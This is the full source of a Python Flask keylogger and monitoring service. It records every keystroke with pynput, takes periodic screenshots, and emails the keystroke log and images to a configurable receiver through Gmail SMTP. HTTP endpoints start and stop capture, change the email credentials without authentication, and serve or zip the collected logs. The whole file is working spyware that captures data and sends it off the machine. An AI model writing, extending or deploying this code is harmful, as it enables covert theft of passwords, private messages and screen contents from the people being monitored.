import threading
import time
import os
import pyautogui
import smtplib
import psycopg2
import pynput
import jwt
import json
import mimetypes
import shutil
import zipfile
from pynput.keyboard import Listener
from dotenv import load_dotenv
from flask_cors import CORS
from email.message import EmailMessage
from flask import Flask, request, jsonify, send_from_directory,  send_file


CLERK_JWT_PUBLIC_KEY = os.getenv("CLERK_JWT_PUBLIC_KEY")
CLERK_API_URL = "https://api.clerk.dev/v1"


load_dotenv()
CONFIG_FILE = "config.json"

app = Flask(__name__)
CORS(app)

# Database Connection
def get_db_connection():
    return psycopg2.connect(
        dbname=os.getenv("DB_NAME"),
        user=os.getenv("DB_USER"),
        password=os.getenv("DB_PASS"),
        host=os.getenv("DB_HOST"),
        port=os.getenv("DB_PORT")
    )

# Email Configuration
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 465
sender_mail = os.getenv("SENDER_EMAIL")
sender_password = os.getenv("SENDER_PASSWORD")
reciever_mail = os.getenv("RECIEVER_EMAIL")
email_interval = 60
screenshot_interval = 30

# Monitoring Variables
monitoring = False
monitoring_thread = None
keystroke_data = []
keylog_listener = None


# File Paths
LOG_FOLDER = "./logs"
LOG_FILE = os.path.join(LOG_FOLDER, "keylogs.txt")
SCREENSHOT_FOLDER = os.path.join(LOG_FOLDER, "screenshots")
ZIP_FILE = "keylogger_logs.zip"


def load_config():
    if not os.path.exists(CONFIG_FILE):
        default_config = {
            "email_interval": 600,
            "screenshot_interval": 30,
            "keylog_interval": 5,
            "sender_mail": os.getenv("SENDER_EMAIL"),
            "sender_password": os.getenv("SENDER_PASSWORD"),
            "receiver_mail": os.getenv("RECIEVER_EMAIL")
        }
        with open(CONFIG_FILE, "w") as f:
            json.dump(default_config, f)

    with open(CONFIG_FILE, "r") as f:
        return json.load(f)


def save_config(config):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=4)


@app.route("/get_settings", methods=["GET"])
def get_settings():
    """Return the current settings."""
    config = load_config()
    return jsonify(config)

@app.route("/update_settings", methods=["POST"])
def update_settings():
    """Update settings based on user input."""
    try:
        data = request.json
        config = load_config()

        if "email_interval" in data:
            config["email_interval"] = int(data["email_interval"])

        if "screenshot_interval" in data:
            config["screenshot_interval"] = int(data["screenshot_interval"])

        if "keylog_interval" in data:
            config["keylog_interval"] = int(data["keylog_interval"])

        if "sender_mail" in data:
            config["sender_mail"] = data["sender_mail"]

        if "sender_password" in data:
            config["sender_password"] = data["sender_password"]

        if "receiver_mail" in data:
            config["receiver_mail"] = data["receiver_mail"]


        save_config(config)
        return jsonify({"message": "Settings updated successfully", "settings": config})

    except Exception as e:
        return jsonify({"error": str(e)}), 500



def ensure_directories():
    if not os.path.exists(LOG_FOLDER):
        os.makedirs(LOG_FOLDER)
    if not os.path.exists(SCREENSHOT_FOLDER):
        os.makedirs(SCREENSHOT_FOLDER)
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()



def capture_screenshot():
    screenshot_path = os.path.join(SCREENSHOT_FOLDER, f"screenshot_{int(time.time())}.png")
    pyautogui.screenshot().save(screenshot_path)
    return screenshot_path


def on_press(key):
    try:
        key_text = key.char if hasattr(key, 'char') else str(key)
        log_entry = f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key_text}\n"

        with open(LOG_FILE, "a") as log_file:
            log_file.write(log_entry)

    except Exception as e:
        print(f"❌ Keylogger Error: {e}")


def send_email_report():
    try:
        config = load_config()
        sender_mail = config["sender_mail"]
        sender_password = config["sender_password"]
        reciever_mail = config["receiver_mail"]

        msg = EmailMessage()
        msg["Subject"] = "Keylogger Report"
        msg["From"] = sender_mail
        msg["To"] = reciever_mail
        msg.set_content("Attached are the latest keystroke logs and screenshots.")

        # Attach keylogs
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "rb") as f:
                msg.add_attachment(f.read(), maintype="text", subtype="plain", filename="keystrokes.txt")

        # Attach screenshots
        if os.path.exists(SCREENSHOT_FOLDER):
            for filename in sorted(os.listdir(SCREENSHOT_FOLDER)):
                filepath = os.path.join(SCREENSHOT_FOLDER, filename)
                if filename.endswith(".png"):
                    ctype, _ = mimetypes.guess_type(filepath)
                    maintype, subtype = ctype.split("/", 1) if ctype else ("application", "octet-stream")
                    with open(filepath, "rb") as f:
                        msg.add_attachment(f.read(), maintype=maintype, subtype=subtype, filename=filename)

        # Send Email
        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
            server.login(sender_mail, sender_password)
            server.send_message(msg)

        print("✅ Email Sent Successfully!")

    except Exception as e:
        print(f"❌ Email Error: {e}")


# Serve screenshot images from the screenshots folder
@app.route('/screenshots/<filename>')
def get_screenshot(filename):
    return send_from_directory(SCREENSHOT_FOLDER, filename)


def monitor_activity():
    global monitoring, keylog_listener
    last_screenshot_time = time.time()
    last_email_time = time.time()

    with pynput.keyboard.Listener(on_press=on_press) as keylog_listener:
        while monitoring:
            time.sleep(1)  # Check every second

            # Load the latest settings dynamically
            config = load_config()
            email_interval = config["email_interval"]
            screenshot_interval = config["screenshot_interval"]

            # Screenshots at intervals
            if time.time() - last_screenshot_time >= screenshot_interval:
                capture_screenshot()
                last_screenshot_time = time.time()

            # Email at intervals
            if time.time() - last_email_time >= email_interval:
                send_email_report()
                last_email_time = time.time()


def verify_clerk_token(token):
    try:
        # Decode the JWT token using Clerk's public key
        decoded_token = jwt.decode(token, CLERK_JWT_PUBLIC_KEY, algorithms=["RS256"])
        return decoded_token
    except jwt.ExpiredSignatureError:
        return None
    except jwt.InvalidTokenError:
        return None
    
@app.route("/protected", methods=["GET"])
def protected_route():
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return jsonify({"error": "Unauthorized"}), 401

    token = auth_header.split(" ")[1]
    user_data = verify_clerk_token(token)

    if not user_data:
        return jsonify({"error": "Invalid Token"}), 401

    return jsonify({"message": "Authenticated", "user": user_data})


@app.route('/start_monitoring', methods=['POST'])
def start_monitoring():
    global monitoring, monitoring_thread

    if monitoring:
        return jsonify({'message': 'Monitoring already running'}), 400

    ensure_directories()
    monitoring = True
    monitoring_thread = threading.Thread(target=monitor_activity, daemon=True)
    monitoring_thread.start()

    return jsonify({'message': 'Monitoring started'}), 200

    
    
@app.route('/get_logs', methods=['GET'])
def get_logs():
    try:
        # Read keystrokes logs
        keystrokes = []
        keystrokes_file = os.path.join(LOG_FOLDER, "keylogs.txt")
        if os.path.exists(keystrokes_file):
            with open(keystrokes_file, "r") as file:
                keystrokes = file.readlines()

        # Get list of screenshots
        screenshots = []
        if os.path.exists(SCREENSHOT_FOLDER):
            screenshots = [f"http://127.0.0.1:5000/screenshots/{img}" for img in sorted(os.listdir(SCREENSHOT_FOLDER)) if img.endswith(".png")]

        return jsonify({"keystrokes": keystrokes, "screenshots": screenshots})

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/stop_monitoring', methods=['POST'])
def stop_monitoring():
    global monitoring

    if not monitoring:
        return jsonify({'message': 'Monitoring is not running'}), 400

    monitoring = False
    return jsonify({'message': 'Monitoring stopped'}), 200


@app.route("/download_logs", methods=["GET"])
def download_logs():
    """Zips all logs and screenshots, then sends the ZIP file."""
    try:
        # Remove old ZIP if exists
        if os.path.exists(ZIP_FILE):
            os.remove(ZIP_FILE)

        # Create a ZIP archive
        with zipfile.ZipFile(ZIP_FILE, "w") as zipf:
            # Add keylog file
            if os.path.exists(LOG_FILE):
                zipf.write(LOG_FILE, os.path.basename(LOG_FILE))

            # Add screenshots
            if os.path.exists(SCREENSHOT_FOLDER):
                for filename in sorted(os.listdir(SCREENSHOT_FOLDER)):
                    filepath = os.path.join(SCREENSHOT_FOLDER, filename)
                    if filename.endswith(".png"):
                        zipf.write(filepath, os.path.join("screenshots", filename))

        return send_file(ZIP_FILE, as_attachment=True)

    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    ensure_directories()
    app.run(debug=True)

